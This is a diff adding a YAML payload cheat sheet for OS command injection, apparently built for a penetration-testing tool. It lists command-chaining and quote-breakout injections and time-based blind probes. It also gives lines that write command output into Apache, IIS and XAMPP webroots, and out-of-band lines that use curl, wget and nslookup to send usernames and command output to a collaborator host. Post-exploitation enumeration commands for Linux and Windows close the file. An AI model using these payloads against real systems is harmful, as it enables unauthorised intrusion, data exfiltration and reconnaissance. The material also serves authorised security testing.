@@ -1,0 +1,289 @@
+name: OS Command Injection
+
+steps:
+  - title: Basic Detection
+    mode: chain
+    info: |
+      Test whether user input is executed by a shell command.
+
+    entries:
+      - cmd: "& whoami &"
+        info: basic command chaining
+
+      - cmd: "&& whoami &&"
+        info: execute on success
+
+      - cmd: "| whoami"
+        info: pipe execution
+
+      - cmd: "|| whoami"
+        info: execute on failure
+
+      - cmd: "; whoami"
+        info: Unix separator
+
+      - cmd: "`whoami`"
+        info: inline execution
+
+      - cmd: "$(whoami)"
+        info: subshell execution
+
+    look_for:
+      - command output in response
+      - HTTP 500
+      - response differences
+      - application errors
+      - missing parameters
+      - unexpected content
+
+  - title: Command Separators
+    mode: enum
+    info: |
+      Different shells and operating systems support different separators.
+
+    entries:
+      - cmd: "&"
+        info: Windows Linux
+
+      - cmd: "&&"
+        info: Windows Linux
+
+      - cmd: "|"
+        info: Windows Linux
+
+      - cmd: "||"
+        info: Windows Linux
+
+      - cmd: ";"
+        info: Linux Unix
+
+      - cmd: "\\n"
+        info: newline injection
+
+      - cmd: "`<CMD>`"
+        info: inline execution
+
+      - cmd: "$(<CMD>)"
+        info: subshell execution
+
+  - title: Blind Time-Based Detection
+    mode: chain
+    info: |
+      Use timing differences when command output is not reflected.
+
+    entries:
+      - cmd: "& ping -c 10 127.0.0.1 &"
+        info: Linux ping delay
+
+      - cmd: "&& ping -c 10 127.0.0.1 &&"
+        info: Linux conditional execution
+
+      - cmd: "& timeout /T 10 &"
+        info: Windows delay
+
+      - cmd: "& ping -n 10 127.0.0.1 &"
+        info: Windows ping delay
+
+      - cmd: "; sleep 10"
+        info: Linux sleep
+
+    look_for:
+      - delayed responses
+      - timeout behavior
+      - asynchronous execution
+
+  - title: Blind Output Redirection
+    mode: chain
+    info: |
+      Redirect command output to a web-accessible file.
+
+    entries:
+      - cmd: "& whoami > /var/www/html/output.txt &"
+        info: common Apache path
+
+      - cmd: "& whoami > /var/www/images/output.txt &"
+        info: writable images directory
+
+      - cmd: "& ipconfig > C:\\inetpub\\wwwroot\\output.txt &"
+        info: IIS webroot
+
+      - cmd: "& dir > C:\\xampp\\htdocs\\output.txt &"
+        info: XAMPP webroot
+
+    look_for:
+      - accessible output files
+      - writable directories
+      - reflected command output
+
+    notes:
+      - retrieve output through browser
+      - try common static directories
+      - image upload folders are often writable
+
+  - title: Blind OAST Detection
+    mode: chain
+    info: |
+      Trigger external interactions to confirm execution.
+
+    entries:
+      - cmd: "& nslookup <COLLABORATOR> &"
+        info: DNS lookup
+
+      - cmd: "& ping <COLLABORATOR> &"
+        info: ICMP interaction
+
+      - cmd: "& curl http://<COLLABORATOR> &"
+        info: HTTP callback
+
+      - cmd: "& wget http://<COLLABORATOR> &"
+        info: HTTP request
+
+    look_for:
+      - DNS interactions
+      - HTTP requests
+      - asynchronous callbacks
+
+    notes:
+      - Burp Collaborator
+      - interactsh
+      - custom DNS logging
+
+  - title: Blind OAST Exfiltration
+    mode: chain
+    info: |
+      Exfiltrate command output through DNS or HTTP requests.
+
+    entries:
+      - cmd: "& nslookup `whoami`.<COLLABORATOR> &"
+        info: Linux inline execution
+
+      - cmd: "& nslookup $(whoami).<COLLABORATOR> &"
+        info: Linux subshell execution
+
+      - cmd: "& curl http://<COLLABORATOR>/$(whoami) &"
+        info: HTTP exfiltration
+
+      - cmd: "& ping %USERNAME%.<COLLABORATOR> &"
+        info: Windows environment variable
+
+    look_for:
+      - usernames
+      - hostnames
+      - command output
+      - environment data
+
+  - title: Linux Enumeration
+    mode: enum
+    info: |
+      Useful Linux post-exploitation commands.
+
+    entries:
+      - cmd: "whoami"
+        info: current user
+
+      - cmd: "id"
+        info: user and groups
+
+      - cmd: "hostname"
+        info: hostname
+
+      - cmd: "uname -a"
+        info: kernel and OS
+
+      - cmd: "ifconfig"
+        info: network configuration
+
+      - cmd: "ip a"
+        info: interface information
+
+      - cmd: "netstat -an"
+        info: active connections
+
+      - cmd: "ps -ef"
+        info: running processes
+
+      - cmd: "pwd"
+        info: current directory
+
+      - cmd: "ls -la"
+        info: directory contents
+
+  - title: Windows Enumeration
+    mode: enum
+    info: |
+      Useful Windows post-exploitation commands.
+
+    entries:
+      - cmd: "whoami"
+        info: current user
+
+      - cmd: "hostname"
+        info: hostname
+
+      - cmd: "ver"
+        info: OS version
+
+      - cmd: "systeminfo"
+        info: system details
+
+      - cmd: "ipconfig /all"
+        info: network configuration
+
+      - cmd: "netstat -an"
+        info: active connections
+
+      - cmd: "tasklist"
+        info: running processes
+
+      - cmd: "dir"
+        info: directory listing
+
+      - cmd: "set"
+        info: environment variables
+
+  - title: Quoted Context Injection
+    mode: enum
+    info: |
+      Break out of quoted command contexts.
+
+    entries:
+      - cmd: "\" & whoami &"
+        info: double quote breakout
+
+      - cmd: "' & whoami &"
+        info: single quote breakout
+
+      - cmd: "\" && whoami &&"
+        info: conditional execution
+
+      - cmd: "'; whoami"
+        info: Unix separator breakout
+
+    look_for:
+      - syntax changes
+      - broken commands
+      - successful execution
+
+  - title: Useful Files and Directories
+    mode: enum
+    info: |
+      Common locations for output redirection and enumeration.
+
+    entries:
+      - cmd: "/var/www/html/"
+        info: Apache webroot
+
+      - cmd: "/var/www/images/"
+        info: static assets
+
+      - cmd: "/tmp/"
+        info: temporary directory
+
+      - cmd: "C:\\inetpub\\wwwroot\\"
+        info: IIS webroot
+
+      - cmd: "C:\\xampp\\htdocs\\"
+        info: XAMPP webroot
+
+      - cmd: "C:\\Windows\\Temp\\"
+        info: Windows temp directory
